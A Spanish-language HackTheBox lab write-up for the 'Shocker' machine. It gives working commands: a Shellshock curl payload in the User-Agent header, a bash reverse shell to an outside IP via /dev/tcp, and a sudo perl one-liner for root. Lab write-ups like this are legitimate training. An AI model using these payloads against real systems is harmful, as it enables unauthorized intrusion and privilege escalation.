---
title: "Shocker - HackTheBox (Fácil)"
machine: "Shocker"
platform: "HackTheBox"
os: "Linux"
difficulty: "Easy"
tags: ["CVE", "RCE", "Privesc", "Web"]
retired: true
summary: "Shocker es una máquina Linux de dificultad Fácil en HackTheBox que demuestra los peligros de utilizar software desactualizado y las malas configuraciones de per"
draft: false
---
## Índice

---

## Descripción General

**Shocker** es una máquina Linux de dificultad Fácil en HackTheBox que demuestra los peligros de utilizar software desactualizado y las malas configuraciones de permisos. La máquina requiere una enumeración web exhaustiva para descubrir un directorio de scripts CGI oculto, el cual es vulnerable al clásico **CVE-2014-6271 (Shellshock)**.

La escalada de privilegios destaca la importancia de las verificaciones manuales sobre las herramientas automatizadas, aprovechando una configuración permisiva en el archivo `sudoers` que permite ejecutar el intérprete de **Perl** con privilegios de administrador.

Tecnologías clave: Apache 2.4.18, CGI, Bash, Shellshock, Perl, GTFOBins.

---

## Reconocimiento

### Escaneo y Enumeración Web

El escaneo inicial de puertos revela un servidor web Apache ejecutando una versión antigua (2.4.18) en un sistema Ubuntu. La página principal no contiene enlaces ni información útil.

La enumeración estándar de directorios en la raíz (`/`) devuelve únicamente un error 403 Forbidden en `/server-status`. Siguiendo la metodología para servidores Apache clásicos, se realiza un ataque de *fuzzing* dirigido hacia el directorio `/cgi-bin/` buscando archivos ejecutables (`.sh`, `.cgi`, `.pl`, `.py`).

Bash

`gobuster dir -u http://shocker.htb/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50 -x sh,cgi`

**Hallazgo:** El escaneo revela la existencia de un script ejecutable: `/cgi-bin/user.sh` (Status: 200).

---

## Análisis de la Aplicación Web

Al interactuar con el script `user.sh` mediante `curl`, el servidor devuelve una salida de texto simple (típicamente información del sistema o *uptime*).

La combinación de Apache antiguo y la ejecución de scripts Bash a través del módulo CGI levanta una alerta inmediata sobre la vulnerabilidad **Shellshock (CVE-2014-6271)**. En los entornos CGI, el servidor web pasa las cabeceras HTTP (como el `User-Agent`) al script Bash en forma de variables de entorno. Si la versión de Bash es vulnerable, permite inyectar y ejecutar comandos arbitrarios del sistema.

---

## Acceso Inicial - Explotación de Shellshock

Para confirmar la vulnerabilidad, se inyecta un payload de prueba en la cabecera `User-Agent` utilizando la firma de función vacía de Bash `() { :; };` seguida del comando `id`.

Bash

`curl -H "User-Agent: () { :; }; echo; /usr/bin/id" http://shocker.htb/cgi-bin/user.sh`

El servidor responde con el UID del usuario `shelly`, confirmando la Ejecución Remota de Comandos (RCE).

**Explotación:**
Para obtener una shell interactiva, se envía un payload de *Reverse Shell* en Bash. En este punto de la intrusión, se utilizó el *handler* avanzado **Penelope** para atrapar la conexión y realizar un *upgrade* automático a una TTY completamente interactiva (PTY).

Bash

`# Listener en Kali (Penelope)
penelope -p 5555

# Payload inyectado vía Shellshock
curl -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.254/5555 0>&1'" http://shocker.htb/cgi-bin/user.sh`

Penelope captura exitosamente la sesión como el usuario `shelly(1000)`.

---

## Flag de Usuario

Bash

`cat /home/shelly/user.txt
# [Flag de Usuario Oculta]`

---

## Escalada de Privilegios

### Enumeración Local

Inicialmente, la ejecución del módulo automatizado `peass_ng` (LinPEAS) a través de Penelope arrojó registros antiguos en `/var/log/auth.log` que sugerían el uso de `sudo /usr/bin/crontab -e`. Sin embargo, la verificación manual —una práctica esencial en la metodología de post-explotación— reveló el vector real y actual.

Al ejecutar `sudo -l`, se confirmaron los privilegios del usuario `shelly`:

Bash

`Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl`

### Abuso de Binarios (GTFOBins) vía Perl

El usuario `shelly` tiene permitido ejecutar el intérprete de Perl (`/usr/bin/perl`) como el usuario `root` sin necesidad de proporcionar una contraseña.

Consultando las técnicas de *GTFOBins*, Perl puede ser utilizado para invocar una shell del sistema interactiva. Dado que se invoca mediante `sudo`, la nueva shell hereda los privilegios del superusuario.

**Explotación:**

Bash

`sudo /usr/bin/perl -e 'exec "/bin/bash";'`

Al ejecutar el comando, el proceso actual se reemplaza por una shell de Bash con privilegios máximos (`root`).

---

## Flag de Root

Bash

`whoami
# root

cat /root/root.txt
# [Flag de Root Oculta]`

---

## Resumen de la Cadena de Ataque

**SHOCKER**
Cadena de Ataque

**Apache + CGI (Puerto 80)**
▼
**Fuzzing de Extensiones (.sh)**
Hallazgo: `/cgi-bin/user.sh`
▼
**Explotación de Shellshock (CVE-2014-6271)**
Inyección en la cabecera `User-Agent`
▼
**shelly (Reverse Shell)**`user.txt`
▼
**Enumeración de Sudoers (`sudo -l`)**
Permiso `NOPASSWD` para `/usr/bin/perl`
▼
**Bypass de Privilegios (GTFOBins)**`sudo /usr/bin/perl -e 'exec "/bin/bash";'`
▼
**root (Shell Interactiva)**`root.txt`

---

## Herramientas Utilizadas

- **nmap** - Escaneo de puertos y servicios.
- **gobuster** - Fuzzing web y enumeración de archivos/directorios.
- **curl** - Interacción manual HTTP y entrega de payloads.
- **Penelope Shell Handler** - Recepción de reverse shells, estabilización automática de PTY y gestión de sesiones.
- **LinPEAS** - Enumeración de vulnerabilidades locales (módulo `peass_ng` en Penelope).
- **GTFOBins** - Referencia para el abuso de binarios legítimos de Unix.
